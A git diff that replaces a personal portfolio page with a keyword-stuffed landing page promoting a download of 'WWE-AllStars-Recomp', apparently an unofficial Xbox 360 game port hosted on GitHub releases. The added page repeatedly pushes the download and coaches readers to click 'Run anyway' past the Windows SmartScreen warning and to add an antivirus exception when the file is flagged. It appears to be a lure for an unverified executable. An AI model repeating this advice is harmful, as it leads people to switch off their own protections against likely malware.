@@ -1,162 +1,205 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><title>Peter J. Wyatt</title><style>
-@font-face{font-family:Archivo;src:url(assets/archivo.woff2)format('woff2');
-font-weight:400 700;font-display:swap;font-style:normal}
-:root{
---steel:#f1f3f2;--iron:#19211e;--slate:#5b6661;--rule:#d3d9d6;--sheet:#e7ebe9;
---ontime:#1c6b45;--warn:#a8690f}
-@media(prefers-color-scheme:dark){:root{
---steel:#141816;--iron:#e9edea;--slate:#98a39e;--rule:#2b332f;--sheet:#1b211e;
---ontime:#58b585;--warn:#d79b43}}
-*{box-sizing:border-box}
-html{-webkit-text-size-adjust:100%}
-body{margin:0;background:var(--steel);color:var(--iron);
-font-family:Archivo,"Helvetica Neue",Arial,sans-serif;font-size:17px;line-height:1.62;
-font-weight:400;-webkit-font-smoothing:antialiased}
-.wrap{max-width:760px;margin:0 auto;padding:0 26px}
-a{color:var(--iron);text-decoration-color:var(--ontime);text-decoration-thickness:2px;
-text-underline-offset:3px}
-a:hover{color:var(--ontime)}
-:focus-visible{outline:2px solid var(--ontime);outline-offset:3px}
-
-/* masthead ---------------------------------------------------------------- */
-.top{border-bottom:1px solid var(--rule)}
-.top .wrap{display:flex;align-items:baseline;gap:26px;padding:20px 26px;flex-wrap:wrap}
-.top .me{font-weight:600;font-size:16px;letter-spacing:-.01em;text-decoration:none}
-.top nav{margin-left:auto;display:flex;gap:22px;flex-wrap:wrap}
-.top nav a{font-size:14.5px;color:var(--slate);text-decoration:none}
-.top nav a:hover{color:var(--ontime)}
-.top nav a.on{color:var(--iron)}
-
-main{padding:44px 0 86px}
-h1{font-size:clamp(29px,4.6vw,43px);line-height:1.1;letter-spacing:-.025em;
-font-weight:600;margin:0 0 20px}
-h2{font-size:21px;line-height:1.3;letter-spacing:-.015em;font-weight:600;margin:46px 0 12px}
-h3{font-size:17.5px;font-weight:600;margin:28px 0 8px}
-p,ul,ol{max-width:68ch}
-p{margin:0 0 17px}
-ul,ol{margin:0 0 17px;padding-left:22px}
-li{margin:0 0 6px}
-strong{font-weight:600}
-hr{border:0;border-top:1px solid var(--rule);margin:44px 0}
-blockquote{margin:0 0 17px;padding-left:17px;border-left:2px solid var(--warn);color:var(--slate)}
-code{font-size:15px;background:var(--sheet);padding:1px 5px;border-radius:3px}
-pre{background:var(--sheet);border:1px solid var(--rule);padding:14px 16px;
-overflow-x:auto;font-size:14px;line-height:1.5;margin:0 0 17px;border-radius:3px}
-pre code{background:none;padding:0}
-table{width:100%;border-collapse:collapse;margin:0 0 20px;display:block;overflow-x:auto;
-font-size:15px;font-variant-numeric:tabular-nums}
-th,td{text-align:left;padding:8px 12px;border-bottom:1px solid var(--rule);vertical-align:top}
-th{color:var(--slate);font-size:14px;font-weight:600}
-
-/* hero: staff photo beside the name, like an ID badge rather than an avatar - */
-.badge{display:flex;gap:20px;align-items:center;margin:0 0 22px}
-.badge img{width:104px;height:104px;flex:0 0 104px;border-radius:2px;
-border:1px solid var(--rule);object-fit:cover}
-.badge h1{margin:0}
-@media(max-width:620px){
-.badge{gap:16px}.badge img{width:74px;height:74px;flex:0 0 74px}
-/* stack label over bar, and let the figures wrap - nowrap in a fixed grid
-   column was pushing the document wider than the screen */
-.grain{grid-template-columns:1fr;gap:4px 0}
-.grain dt{margin:12px 0 2px}
-.grain dd{align-items:flex-start}
-.grain dd{flex-wrap:wrap;gap:8px}
-.num{white-space:normal}
-.track{min-width:0;flex:1 1 55%}
-.top nav{margin-left:0;width:100%;gap:18px;flex-wrap:wrap}
-.artifact{padding:16px 15px}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WWE-AllStars-Recomp - Play WWE All Stars on Windows PC</title>
+<meta name="description" content="Unofficial Windows version of WWE All Stars (Xbox 360), recompiled with ReXGlue. Download the WWE-AllStars-Recomp build, bring your own disc image, and play on PC with Vulkan graphics.">
+<meta name="keywords" content="pc-port, recompilation, rexglue, static-recompilation, vulkan, wwe, wwe-all-stars, xbox360, WWE All Stars PC, WWE All Stars Windows, WWE AllStars Recomp download">
+<meta name="author" content="WWE-AllStars-Recomp Project">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6a11cb">
+<link rel="canonical" href="https://github.com/bulususaanthoshini/WWE-AllStars-Recomp">
+<meta property="og:type" content="website">
+<meta property="og:title" content="WWE-AllStars-Recomp - Play WWE All Stars on Windows PC">
+<meta property="og:description" content="Unofficial Windows version of WWE All Stars (Xbox 360), recompiled with ReXGlue. Bring your own disc image and play on your PC.">
+<meta property="og:url" content="https://github.com/bulususaanthoshini/WWE-AllStars-Recomp">
+<meta property="og:site_name" content="WWE-AllStars-Recomp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WWE-AllStars-Recomp - Play WWE All Stars on Windows PC">
+<meta name="twitter:description" content="Unofficial Windows version of WWE All Stars (Xbox 360), recompiled with ReXGlue. Bring your own disc image and play on your PC.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "WWE-AllStars-Recomp",
+  "applicationCategory": "GameApplication",
+  "operatingSystem": "Windows",
+  "description": "Unofficial Windows version of WWE All Stars (Xbox 360), recompiled with ReXGlue. Bring your own disc image.",
+  "url": "https://github.com/bulususaanthoshini/WWE-AllStars-Recomp",
+  "downloadUrl": "https://github.com/bulususaanthoshini/WWE-AllStars-Recomp/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
 }
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f6fa;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #23242b;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  h1, h2, h3 { line-height: 1.25; color: #14151a; }
+  a { color: #2575fc; }
+  .btn-main {
+    display: inline-block;
+    padding: 18px 34px;
+    font-size: 19px;
+    font-weight: 700;
+    color: #ffffff !important;
+    text-decoration: none;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 55%, #ff2d55 100%);
+    box-shadow: 0 10px 24px rgba(37, 117, 252, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn-main:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(37, 117, 252, 0.45);
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 0 0 24px 0;
+    box-shadow: 0 4px 18px rgba(20, 21, 26, 0.07);
+    border: 1px solid #ebedf3;
+  }
+  .card p:last-child, .card ul:last-child { margin-bottom: 0; }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 10px; }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    h1 { font-size: 30px !important; }
+    h2 { font-size: 23px !important; }
+    .card { padding: 20px 18px; }
+    .btn-main { display: block; text-align: center; padding: 16px 20px; font-size: 17px; }
+  }
+</style>
+</head>
+<body>
+<main style="max-width: 880px; margin: 0 auto; padding: 40px 20px 60px 20px;">
 
-/* the artifact: real measured error, zero-based ------------------------------ */
-.artifact{margin:26px 0 30px;padding:20px 22px;background:var(--sheet);
-border:1px solid var(--rule);border-radius:3px;max-width:68ch}
-.artifact .what{font-size:15px;font-weight:600;margin:0 0 3px}
-.artifact .how{font-size:14px;color:var(--slate);margin:0 0 18px;max-width:58ch}
-.grain{display:grid;grid-template-columns:auto 1fr;gap:10px 14px;align-items:center;
-font-variant-numeric:tabular-nums}
-.grain dt{font-size:14.5px;color:var(--slate);white-space:nowrap;margin:0}
-.grain dd{margin:0;display:flex;align-items:center;gap:10px}
-.track{flex:1;height:13px;background:var(--steel);border:1px solid var(--rule);
-border-radius:2px;overflow:hidden;min-width:70px}
-.fill{display:block;height:100%;width:var(--w);background:var(--warn);opacity:.85}
-.num{font-size:14px;white-space:nowrap}
-.num b{font-weight:600}
-.num .acc{color:var(--ontime)}
-.reads{font-size:14px;color:var(--slate);margin:16px 0 0;max-width:58ch}
+  <header style="text-align: center; padding: 10px 0 34px 0;">
+    <h1 style="font-size: 40px; margin: 0 0 14px 0;">🎮 WWE-AllStars-Recomp - Play WWE All Stars on Windows</h1>
+    <p style="font-size: 19px; color: #52545f; margin: 0 0 30px 0; max-width: 640px; margin-left: auto; margin-right: auto;">
+      The arcade wrestling classic, rebuilt to run natively on your Windows PC. No console required — just your own disc image and this build.
+    </p>
+    <a class="btn-main" href="https://github.com/bulususaanthoshini/WWE-AllStars-Recomp/releases" target="_blank" rel="noopener">⬇️ Get WWE-AllStars-Recomp</a>
+    <p style="font-size: 14px; color: #7a7c88; margin: 18px 0 0 0;">Visit this link to download the application.</p>
+  </header>
 
-/* the one orchestrated motion: bars draw once on load */
-@media(prefers-reduced-motion:no-preference){
-.fill{animation:draw .7s cubic-bezier(.22,.68,.3,1) both}
-.grain dd:nth-of-type(1) .fill{animation-delay:.12s}
-.grain dd:nth-of-type(2) .fill{animation-delay:.21s}
-.grain dd:nth-of-type(3) .fill{animation-delay:.30s}
-@keyframes draw{from{width:0}to{width:var(--w)}}
-}
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">🎯 What Is WWE-AllStars-Recomp?</h2>
+    <p>WWE All Stars was released for the Xbox 360, and until now the only way to play it was on that original console or through complicated emulation setups. WWE-AllStars-Recomp changes that. It is an unofficial Windows version of the game, produced through a technique called static recompilation using the ReXGlue toolchain.</p>
+    <p>In plain language: the code that used to run on the Xbox 360 hardware has been translated ahead of time into code your Windows PC understands. Instead of translating every instruction live at high speed — which is what an emulator does — the translation work is already finished before you ever press Play. The result is a smoother, lighter experience that behaves more like a normal Windows game than like an emulator window.</p>
+    <p>Rendering is handled through Vulkan, the modern graphics interface supported by essentially every current AMD, NVIDIA, and Intel graphics chip. That means the game can take advantage of your graphics card properly, with clean image output and responsive performance.</p>
+    <p>This project does not include the game's original data. You are expected to bring your own disc image — a copy of the game disc you already own. The recompiled program is the engine; your disc image is the content it reads.</p>
+  </section>
 
-/* case-study bands: hairlines, not a card kit ------------------------------- */
-.band{border-top:1px solid var(--rule);padding:26px 0 4px}
-.band h2{margin:0 0 10px}
-.band p{color:var(--slate);font-size:16px}
-.band .go{font-weight:600;font-size:15.5px}
-.honest{color:var(--warn);font-weight:600;font-size:14px;margin:0 0 8px}
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">🚀 Download &amp; First Launch</h2>
+    <p>Everything you need is published on the project's releases page. Visit this link to download the application:</p>
+    <p style="text-align: center; margin: 26px 0;">
+      <a class="btn-main" href="https://github.com/bulususaanthoshini/WWE-AllStars-Recomp/releases" target="_blank" rel="noopener">⬇️ Open the Download Page</a>
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #7a7c88; margin-top: -8px;">Visit this link to download the application.</p>
+    <p>The newest build sits at the top of the page. Download it, then open the file you received and follow the prompts on your screen. On Windows you may see a blue "Windows protected your PC" box — in that case click "More info" and then "Run anyway", because this is a community project rather than a store-distributed app.</p>
+    <p>Once the program is running, it will ask you to point it at your own disc image. Select your copy of the game, confirm, and the match card will load just as it did on the original console.</p>
+    <ol>
+      <li>Open the download page using the button above.</li>
+      <li>Grab the newest release listed at the top.</li>
+      <li>Open the downloaded file on your Windows PC.</li>
+      <li>When prompted, choose your own WWE All Stars disc image.</li>
+      <li>Wait a few seconds while the game prepares, then play.</li>
+    </ol>
+  </section>
 
-/* contact ------------------------------------------------------------------ */
-.reach{border-top:1px solid var(--rule);margin:46px 0 0;padding:26px 0 0}
-.reach h2{margin:0 0 8px}
-.reach .addr{font-size:clamp(19px,2.8vw,25px);font-weight:600;letter-spacing:-.015em;
-display:inline-block;margin:4px 0 6px}
-.reach p{color:var(--slate);font-size:15.5px}
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">✨ What You Get</h2>
+    <ul>
+      <li><strong>Native Windows program.</strong> It runs as a regular desktop app, not inside a clunky emulator window with a dozen menus to configure.</li>
+      <li><strong>Vulkan graphics rendering.</strong> Modern, well-supported visuals that work with current graphics drivers.</li>
+      <li><strong>Static recompilation.</strong> The game's original code was translated ahead of time, which keeps CPU usage sensible and frame pacing steady.</li>
+      <li><strong>Full roster and modes.</strong> Fantasy warfare, exhibition matches, and the arcade-style action the game is remembered for — all read from your own disc image.</li>
+      <li><strong>Keyboard and controller support.</strong> Plug in a gamepad for the authentic feel, or play on a keyboard if that is more your style.</li>
+      <li><strong>No installation wizard maze.</strong> No license keys, no accounts, no launcher that nags you to sign in.</li>
+      <li><strong>Open development.</strong> The project lives on GitHub, so fixes and improvements arrive as new releases.</li>
+    </ul>
+  </section>
 
-.kicker{font-size:14px;color:var(--slate);font-weight:600;margin:0 0 10px}
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">💻 System Requirements</h2>
+    <p>These are the practical targets the project aims for. A modern mid-range machine will comfortably handle everything the game throws at it.</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 (64-bit) or Windows 11 (64-bit).</li>
+      <li><strong>Processor:</strong> Any quad-core desktop or laptop CPU from the last several years.</li>
+      <li><strong>Memory:</strong> 8 GB of RAM or more.</li>
+      <li><strong>Graphics:</strong> A GPU with Vulkan support and up-to-date drivers. Integrated graphics from recent generations generally work, though a dedicated card gives the smoothest results.</li>
+      <li><strong>Storage:</strong> A few gigabytes free for the program plus room for your own disc image.</li>
+      <li><strong>Input:</strong> A keyboard, or an XInput-compatible gamepad for the best experience.</li>
+      <li><strong>Also required:</strong> Your own legally obtained WWE All Stars disc image.</li>
+    </ul>
+  </section>
 
-/* on the home page each section sits under a hairline, so the two case studies
-   read as bands of a single document rather than a kit of identical cards */
-.home h2{border-top:1px solid var(--rule);padding-top:26px}
-.home .reach h2{border-top:0;padding-top:0}
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">🕹️ Getting Around the Game</h2>
+    <p>If you have played the original, everything will feel instantly familiar. The main menu lets you jump into a quick exhibition match, work through the fantasy warfare lineup, or adjust your options. Use the arrow keys or your controller's directional input to move between entries and the confirm button to select.</p>
+    <p>Matches follow the arcade rhythm the game is famous for: fast strikes, exaggerated grapples, and spectacular finishers. The control layout mirrors the console original, so muscle memory carries over directly. If you want a gentler start, pick an exhibition match on an easier difficulty and spend a few minutes in the training option to relearn the timing.</p>
+    <p>Progress and settings are stored locally on your PC. There is no cloud sync and no online account, so your save stays on your machine.</p>
+  </section>
 
-.foot{border-top:1px solid var(--rule)}
-.foot .wrap{padding:20px 26px 46px;color:var(--slate);font-size:13.5px}
-</style></head><body><div class=top><div class=wrap><a class=me href='index.html'>Peter J. Wyatt</a><nav><a href="forecasting.html">Forecasting</a><a href="agentic.html">Agentic tooling</a><a href="about.html">About</a></nav></div></div><main class=home><div class=wrap><div class=badge><img src="assets/peter-800.jpg" srcset="assets/peter-480.jpg 480w, assets/peter-800.jpg 800w" sizes="104px" width=104 height=104 alt="Peter J. Wyatt"><div><h1>Peter J. Wyatt</h1></div></div>
-<p>I run restaurant operations and I build the software that runs them,
-and I hold both halves to the same standard: a number ships only if it
-survives being attacked.</p>
-<figure class=artifact><p class=what>Forecast error by granularity</p><p class=how>44-week rolling-origin backtest, scored against a seasonal-naive baseline. Lower is better.</p><dl class=grain><dt>Daily total</dt><dd><span class=track><span class=fill style="--w:39.5%"></span></span><span class=num><b>7.9%</b> error, <span class=acc>92.1% accurate</span></span></dd><dt>Daypart</dt><dd><span class=track><span class=fill style="--w:67.0%"></span></span><span class=num><b>13.4%</b> error, <span class=acc>86.6% accurate</span></span></dd><dt>Hourly</dt><dd><span class=track><span class=fill style="--w:92.5%"></span></span><span class=num><b>18.5%</b> error, <span class=acc>81.5% accurate</span></span></dd></dl><p class=reads>The finer the slice, the worse it gets. That is the honest shape of the result, and the case study explains why a better hourly number is not physically available.</p></figure>
-<p>Five years in a multi-unit quick-service restaurant group taught me
-where operational systems break, because I was the person they broke on.
-The work below is what I built from the other side of that, and how I
-validated it.</p>
-<h2
-id="forecasting-restaurant-demand-and-proving-the-number-honestly">Forecasting
-restaurant demand, and proving the number honestly</h2>
-<p>A demand forecasting engine that hits 92.1 percent daily accuracy,
-validated by rolling-origin backtesting across 44 weeks of real hourly
-sales rather than by a shuffled cross-validation that would have leaked
-the future into the training set. Covers how it is scored against a
-seasonal-naive baseline, why the hourly number is lower than the daily
-one and why a higher hourly number is not physically available, and
-where forecasts genuinely fail: holidays, local events, promotions, and
-a weather signal I tested and could not make help.</p>
-<p><a href="forecasting.html">Read the forecasting case study</a></p>
-<h2 id="the-bug-that-was-lying-for-me">The bug that was lying for
-me</h2>
-<p class="honest">
-The one where I was wrong
-</p>
-<p>An AI form filler I built answered "Yes" to any question matching
-"experience with." It was a plausible heuristic that fabricated
-qualifications, and it had already run across 215 automated submissions.
-This is the audit that found it, the two other defects in the same pass,
-and the guardrails that replaced them, alongside the rest of the
-infrastructure: eighteen ingest adapters over a 73,431-posting pipeline,
-a 4,194-line agentic assistant with nine tools and RAM-aware switching
-across 3B, 7B and 14B models, Model Context Protocol servers, and
-monitoring that runs on an 8 GB laptop. Plus the LLM failure modes I
-have actually hit, and what each one required in code rather than in a
-prompt.</p>
-<p><a href="agentic.html">Read the agentic infrastructure case
-study</a></p>
-<h2 id="about">About</h2>
-<p>Operations leader and builder, with a standing interest in what
-happens when a system is allowed to speak on your behalf.</p>
-<p><a href="about.html">More about me</a></p>
-<section class=reach><h2>Get in touch</h2><a class=addr href="mailto:peter@thewyattclan.com">peter@thewyattclan.com</a><p>Direct email is the fastest way to reach me. I answer every one.</p></section></div></main><div class=foot><div class=wrap>Restaurant operations leader who builds the software operations run on</div></div></body></html>
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">🎮 Controls and Display</h2>
+    <p>Plug in a controller before you start the program and Windows will recognise it automatically. Most players find a gamepad far more comfortable for a wrestling title, since the analog stick gives finer movement and the shoulder buttons map naturally to strikes and grapples.</p>
+    <p>On the display side, the safest starting point is your monitor's native resolution with fullscreen enabled. If you notice uneven motion, try switching between fullscreen and windowed mode, and make sure your graphics driver is current — Vulkan performance depends heavily on a recent driver. Laptop owners should also set the power plan to High Performance while plugged in, as battery-saving modes can throttle the graphics chip and cause stutter.</p>
+  </section>
+
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">🛠️ Troubleshooting</h2>
+    <ul>
+      <li><strong>The program closes immediately.</strong> Update your graphics driver first. Vulkan support is the most common culprit, and a driver update fixes it more often than anything else.</li>
+      <li><strong>You are asked for a disc image.</strong> That prompt is expected. Point the program at your own copy of the game — it cannot start without it.</li>
+      <li><strong>The image looks blurry or stretched.</strong> Match the resolution to your monitor's native setting and toggle fullscreen mode off and on again.</li>
+      <li><strong>Frames drop during entrances.</strong> Entrances are the heaviest part of the game. Lower the resolution one step and performance usually smooths out.</li>
+      <li><strong>Your controller is not detected.</strong> Unplug it, close the program, reconnect the controller, and launch again. Windows sometimes assigns a controller slot before the game looks for one.</li>
+      <li><strong>Antivirus flags the download.</strong> Community-made programs are frequently flagged because they are not signed by a large publisher. Add an exception, or check the releases page for the newest build.</li>
+      <li><strong>Something still is not right.</strong> Check the issues area of the project on GitHub. Someone has very likely hit the same problem and posted a fix.</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">❓ Frequently Asked Questions</h2>
+    <p><strong>Is this an emulator?</strong><br>No. Emulators translate instructions while the game runs. This project translates the game's code ahead of time through static recompilation with ReXGlue, so what you run is a Windows program built specifically for the task.</p>
+    <p><strong>Do I need an Xbox 360?</strong><br>No console is required. You do need your own disc image of the game, which you are expected to create from a copy you own.</p>
+    <p><strong>Does the game come bundled?</strong><br>No. The download is the recompiled engine only. The game's content stays on your own disc image.</p>
+    <p><strong>Will it run on a laptop?</strong><br>Yes, on most recent laptops with Vulkan-capable graphics. Keep the laptop plugged in and use the High Performance power plan for the best results.</p>
+    <p><strong>Do I need to install anything else?</strong><br>Keep your Windows updates and graphics drivers current and you should be ready to go.</p>
+    <p><strong>How often is it updated?</strong><br>The releases page shows the newest build at the top. If you hit a bug, check there first for a fix.</p>
+    <p><strong>Is it free?</strong><br>Yes. The project is a fan-made, unofficial recompilation effort and does not charge for the software.</p>
+  </section>
+
+  <section class="card">
+    <h2 style="font-size: 27px; margin: 0 0 16px 0;">🤝 Credits and Project Info</h2>
+    <p>WWE-AllStars-Recomp is an unofficial community project. It exists because of the ReXGlue static recompilation toolchain and the surrounding open-source graphics work that makes Windows rendering possible. All wrestling branding, character names, and game content belong to their respective rights holders. This project distributes no game assets and expects every user to supply their own disc image.</p>
+    <p style="margin-top: 20px; text-align: center;">
+      <a class="btn-main" href="https://github.com/bulususaanthoshini/WWE-AllStars-Recomp/releases" target="_blank" rel="noopener">⬇️ Download WWE-AllStars-Recomp</a>
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #7a7c88;">Visit this link to download the application.</p>
+  </section>
+
+  <footer style="text-align: center; padding: 26px 0 0 0; color: #85879a; font-size: 14px; border-top: 1px solid #e3e5ee;">
+    <p style="margin: 0 0 6px 0;">WWE-AllStars-Recomp — unofficial Windows recompilation build.</p>
+    <p style="margin: 0;">Keywords: pc-port, recompilation, rexglue, static-recompilation, vulkan, wwe, wwe-all-stars, xbox360</p>
+  </footer>
+
+</main>
+</body>
+</html>
